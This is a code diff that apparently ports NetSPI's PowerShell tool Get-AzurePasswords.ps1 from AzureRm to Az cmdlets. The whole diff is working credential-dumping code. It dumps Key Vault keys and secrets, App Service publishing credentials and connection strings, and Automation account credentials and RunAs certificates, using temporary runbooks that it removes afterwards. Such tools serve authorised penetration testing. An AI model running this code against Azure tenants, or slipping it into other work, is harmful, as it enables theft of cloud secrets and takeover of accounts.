@@ -1,4 +1,4 @@
-﻿<#
+<#
     File: Get-AzurePasswords.ps1
     Author: Karl Fosaaen (@kfosaaen), NetSPI - 2019
     Description: PowerShell function for dumping Azure credentials.
@@ -92,21 +92,21 @@ Function Get-AzurePasswords
     )
 
     # Check to see if we're logged in
-    $LoginStatus = Get-AzureRmContext
+    $LoginStatus = Get-AzContext
     $accountName = $LoginStatus.Account
     if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
-        try {Login-AzureRmAccount -ErrorAction Stop}
+        try {Login-AzAccount -ErrorAction Stop}
         catch{Write-Warning "Login process failed."}
         }
     else{}
 
     # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzureRmSubscription"
     if ($Subscription){        
-        Select-AzureRmSubscription -SubscriptionName $Subscription | Out-Null
+        Select-AzSubscription -Subscription $Subscription | Out-Null
     }
     else{
         # List subscriptions, pipe out to gridview selection
-        $Subscriptions = Get-AzureRmSubscription -WarningAction SilentlyContinue
+        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
         foreach ($sub in $subChoice) {Get-AzurePasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword}
         break
@@ -130,22 +130,22 @@ Function Get-AzurePasswords
 
     if($Keys -eq 'Y'){
         # Key Vault Section
-        $vaults = Get-AzureRmKeyVault
+        $vaults = Get-AzKeyVault
         Write-Verbose "Getting List of Key Vaults..."
-        $subName = (Get-AzureRmSubscription -SubscriptionId $Subscription).Name
+        $subName = (Get-AzSubscription -SubscriptionId $Subscription).Name
 
         foreach ($vault in $vaults){
             $vaultName = $vault.VaultName
             
             try{
-                $keylist = Get-AzureKeyVaultKey -VaultName $vaultName -ErrorAction Stop
+                $keylist = Get-AzKeyVaultKey -VaultName $vaultName -ErrorAction Stop
 
                 # Dump Keys
                 Write-Verbose "`tExporting items from $vaultName"
                 foreach ($key in $keylist){
                     $keyname = $key.Name
                     Write-Verbose "`t`tGetting Key value for the $keyname Key"
-                    $keyValue = Get-AzureKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
+                    $keyValue = Get-AzKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
             
                     # Add Key to the table
                     $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null
@@ -156,14 +156,14 @@ Function Get-AzurePasswords
             
 
             # Dump Secrets
-            try{$secrets = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop}
+            try{$secrets = Get-AzKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop}
             catch{Write-Verbose "`t`tUnable to access secrets for the $vaultName key vault"; Continue}
 
             foreach ($secret in $secrets){
                 $secretname = $secret.Name
                 Write-Verbose "`t`tGetting Secret value for the $secretname Secret"
                 Try{
-                    $secretValue = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name -ErrorAction Stop
+                    $secretValue = Get-AzKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name -ErrorAction Stop
 
                     $secretType = $secretValue.ContentType
 
@@ -191,14 +191,14 @@ Function Get-AzurePasswords
         Write-Verbose "Getting List of Azure App Services..."
 
         # Read App Services configs
-        $appServs = Get-AzureRmWebApp
+        $appServs = Get-AzWebApp
         $appServs | ForEach-Object{
             $appServiceName = $_.Name
-            $resourceGroupName = Get-AzureRmResource -ResourceId $_.Id | select ResourceGroupName
+            $resourceGroupName = Get-AzResource -ResourceId $_.Id | select ResourceGroupName
 
             # Get each config 
             try{
-                [xml]$configFile = Get-AzureRmWebAppPublishingProfile -ResourceGroup $resourceGroupName.ResourceGroupName -Name $_.Name -ErrorAction Stop
+                [xml]$configFile = Get-AzWebAppPublishingProfile -ResourceGroupName $resourceGroupName.ResourceGroupName -Name $_.Name -ErrorAction Stop
             
                 if ($configFile){
                     foreach ($profile in $configFile.publishData.publishProfile){
@@ -215,7 +215,7 @@ Function Get-AzurePasswords
                     }
                     # Grab additional custom connection strings
                     $resourceName = $_.Name+"/connectionstrings"
-                    $resource = Invoke-AzureRmResourceAction -ResourceGroupName $_.ResourceGroup -ResourceType Microsoft.Web/sites/config -ResourceName $resourceName -Action list -ApiVersion 2015-08-01 -Force
+                    $resource = Invoke-AzResourceAction -ResourceGroupName $_.ResourceGroup -ResourceType Microsoft.Web/sites/config -ResourceName $resourceName -Action list -ApiVersion 2015-08-01 -Force
                     $propName = $resource.properties | gm -M NoteProperty | select name
                     if($resource.Properties.($propName.Name).type -eq 3){$TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+"-Custom-ConnectionString","N/A",$resource.Properties.($propName.Name).value,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null}
                 }
@@ -227,14 +227,14 @@ Function Get-AzurePasswords
 
     if ($AutomationAccounts -eq 'Y'){
         # Automation Accounts Section
-        $AutoAccounts = Get-AzureRmAutomationAccount
+        $AutoAccounts = Get-AzAutomationAccount
         Write-Verbose "Getting List of Azure Automation Accounts..."
         foreach ($AutoAccount in $AutoAccounts){
 
             $verboseName = $AutoAccount.AutomationAccountName
 
             # Grab the automation cred username
-            $autoCred = (Get-AzureRmAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName).Name
+            $autoCred = (Get-AzAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName).Name
 
             # Set Random names for the runbooks. Prevents conflict issues
             $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
@@ -253,10 +253,10 @@ Function Get-AzurePasswords
             $AutoAccountRG = $AutoAccount.ResourceGroupName
 
             # Get this data into the script now, so you don't need an account later to grab it
-            $thumbprint = (Get-AzureRmAutomationCertificate -ResourceGroupName $AutoAccountRG -AutomationAccountName $verboseName | where Name -EQ 'AzureRunAsCertificate').Thumbprint
-            $tenantID = (Get-AzureRmContext).Tenant.Id
+            $thumbprint = (Get-AzAutomationCertificate -ResourceGroupName $AutoAccountRG -AutomationAccountName $verboseName | where Name -EQ 'AzureRunAsCertificate').Thumbprint
+            $tenantID = (Get-AzContext).Tenant.Id
             # This is a hackish workaround for right now... There's no easy ways for grabbing the automation account AppID. If the automation account SPN is renamed in AzureAD, this won't work
-            $appId = (Get-AzureRmADApplication -DisplayNameStartWith $verboseName).ApplicationId
+            $appId = (Get-AzADApplication -DisplayNameStartWith $verboseName).ApplicationId
             if ($appId -eq $null){Write-Warning "No AppID found for the $verboseName Automation Account. Look up the AppId in AzureAD and add it to the AuthenticateAs-$verboseName.ps1 file"}
 
             "`$thumbprint = '$thumbprint'"| Out-File -FilePath "$pwd\AuthenticateAs-$verboseName.ps1"
@@ -289,23 +289,23 @@ Function Get-AzurePasswords
             if (Test-Path $pwd\$jobName.ps1 -PathType Leaf){
                 Write-Verbose "`tGetting the RunAs certificate for $verboseName using the $jobName.ps1 Runbook"
                 try{
-                    Import-AzureRmAutomationRunbook -Path $pwd\$jobName.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobName | Out-Null
+                    Import-AzAutomationRunbook -Path $pwd\$jobName.ps1 -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobName | Out-Null
 
                     # Publish the runbook
-                    Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobName | Out-Null
+                    Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Name $jobName | Out-Null
 
                     # Run the runbook and get the job id
-                    $jobID = Start-AzureRmAutomationRunbook -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
+                    $jobID = Start-AzAutomationRunbook -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
 
-                    $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                    $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
 
                     # Wait for the job to complete
                     Write-Verbose "`t`tWaiting for the automation job to complete"
                     while($jobstatus.Status -ne "Completed"){
-                        $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                     }    
 
-                    $jobOutput = Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzureRmAutomationJobOutputRecord | Select-Object -ExpandProperty Value
+                    $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
                                                 
                     # Write it to a local file
                     $FileName = Join-Path $pwd $verboseName"-AzureRunAsCertificate.pfx"
@@ -316,7 +316,7 @@ Function Get-AzurePasswords
 
                     # clean up
                     Write-Verbose "`t`tRemoving $jobName runbook from $verboseName Automation Account"
-                    Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
+                    Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                 }
                 Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
             }
@@ -332,26 +332,26 @@ Function Get-AzurePasswords
                         Write-Verbose "`t`tGetting cleartext credentials for $autoCredCurrent using the $jobToRun.ps1 Runbook"
                         $autoCredIter++
                         try{
-                            Import-AzureRmAutomationRunbook -Path $pwd\$jobToRun.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRun | Out-Null
+                            Import-AzAutomationRunbook -Path $pwd\$jobToRun.ps1 -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRun | Out-Null
 
                             # publish the runbook
-                            Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRun | Out-Null
+                            Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Name $jobToRun | Out-Null
 
                             # run the runbook and get the job id
-                            $jobID = Start-AzureRmAutomationRunbook -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
+                            $jobID = Start-AzAutomationRunbook -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
 
-                            $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                            $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
 
                             # Wait for the job to complete
                             Write-Verbose "`t`t`tWaiting for the automation job to complete"
                             while($jobstatus.Status -ne "Completed"){
-                                $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                                $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                             }    
 
                             # If there was an actual cred here, get the output and add it to the table                    
                             try{
                                 # Get the output
-                                $jobOutput = (Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | select Summary).Summary
+                                $jobOutput = (Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | select Summary).Summary
                                 
                                 if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
         
@@ -362,7 +362,7 @@ Function Get-AzurePasswords
 
                             # clean up
                             Write-Verbose "`t`tRemoving $jobToRun runbook from $verboseName Automation Account"
-                            Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -Force
+                            Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                         }
                         Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
 
@@ -380,6 +380,7 @@ Function Get-AzurePasswords
     # Output Creds
     Write-Output $TempTblCreds
 }
+
 
 
 
